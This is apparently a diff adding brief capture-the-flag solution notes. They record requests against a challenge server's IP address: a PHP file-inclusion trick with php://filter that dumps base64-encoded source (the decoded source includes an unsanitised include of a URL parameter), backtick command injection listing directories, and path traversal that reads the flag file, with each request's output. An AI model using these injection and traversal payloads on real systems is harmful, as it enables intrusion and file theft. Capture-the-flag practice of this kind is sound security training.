@@ -1,0 +1,23 @@
+http://34.72.118.158:6284/fun1.php?file=php://filter/convert.base64-encode/resource=fun1.php
+	PD9waHAKJGZpbGUgPSAkX0dFVFsiZmlsZSJdOwppZihpc3NldCgkZmlsZSkpCnsKICAgICAgICBpbmNsdWRlKCRmaWxlKTsKfQplbHNlCnsKICAgICAgICBpbmNsdWRlKCJzdWdlIik7Cn0KPz4KCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Cmh0bWwsIGJvZHl7d2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsgcGFkZGluZzogMDsgbWFyZ2luOiAwfQpkaXZ7cG9zaXRpb246IGFic29sdXRlOyBwYWRkaW5nOiAwZW07IGJvcmRlcjogMXB4IHNvbGlkICMwMDB9CiNud3t0b3A6IDEwJTsgbGVmdDogMDsgcmlnaHQ6IDUwJTsgYm90dG9tOiA1MCV9CiNuZXt0b3A6IDA7IGxlZnQ6IDUwJTsgcmlnaHQ6IDA7IGJvdHRvbTogNTAlfQojc3d7dG9wOiA1MCU7IGxlZnQ6IDA7IHJpZ2h0OiA1MCU7IGJvdHRvbTogMH0KI3Nle3RvcDogNTAlOyBsZWZ0OiA1MCU7IHJpZ2h0OiAwOyBib3R0b206IDB9Cjwvc3R5bGU+Cgo8ZGl2IGlkPSJudyI+PGltZyBzcmM9Ii9pbWcvZGFiYWJ5NC5qcGciIHN0eWxlPSJ3aWR0aDoxMDAlO2hlaWdodDoxMDAlOyI+PC9kaXY+CjxkaXYgaWQ9Im5lIj48aW1nIHNyYz0iL2ltZy9kYWJhYnk1LmpwZyIgc3R5bGU9IndpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7Ij48L2Rpdj4KPGRpdiBpZD0ic3ciPjxpbWcgc3JjPSIvaW1nL2RhYmFieTYuanBnIiBzdHlsZT0id2lkdGg6MTAwJTpoZWlnaHQ6MTAwJTsiPjwvZGl2Pgo8ZGl2IGlkPSJzZSI+PGltZyBzcmM9Ii9pbWcvZGFiYWJ5Ny5wbmciIHN0eWxlPSJ3aWR0aDoxMDAlOmhlaWdodDoxMDAlOyI+PC9kaXY+Cg==
+
+
+http://34.72.118.158:6284/fun1.php?file=php://filter/convert.base64-encode/resource=fun.php
+
+http://34.72.118.158:6284/fun.php?string=%60ls+-al%60+%23
+	total 32
+	dr-xr-xr-x 1 www-data www-data 4096 Apr 10 15:35 .
+	drwxr-xr-x 1 root root 4096 Apr 10 23:25 ..
+	-r-xr-xr-x 1 root root 35 Apr 10 15:35 dababy.sh
+	-r--r--r-- 1 root root 1359 Apr 10 15:35 fun.php
+	-r--r--r-- 1 root root 775 Apr 10 15:35 fun1.php
+	dr-xr-xr-x 1 root root 4096 Apr 10 15:35 img
+	-r--r--r-- 1 root root 374 Apr 10 15:35 index.php
+	-r--r--r-- 1 root root 284 Apr 10 15:35 suge
+
+http://34.72.118.158:6284/fun.php?string=%60ls+%2Fvar%2Fwww%2F%60+%23
+	flag.txt html secr3t.txt
+
+
+http://34.72.118.158:6284/fun1.php?file=../flag.txt
+	RS{J3TS0N_M4D3_4N0TH3R_0N3}
